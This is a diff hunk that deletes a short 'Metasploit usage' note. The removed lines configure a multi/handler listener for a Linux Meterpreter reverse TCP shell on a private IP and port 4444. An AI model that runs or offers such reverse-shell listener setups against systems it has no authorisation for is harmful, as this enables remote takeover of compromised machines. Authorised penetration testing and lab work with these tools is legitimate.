@@ -1,7 +1,0 @@
-Metasploit usage:
-use exploit/multi/handler
-set lhost = 192.168.100.5
-set lport = 4444
-set PAYLOAD linux/x86/meterpreter/reverse_tcp
-run
-
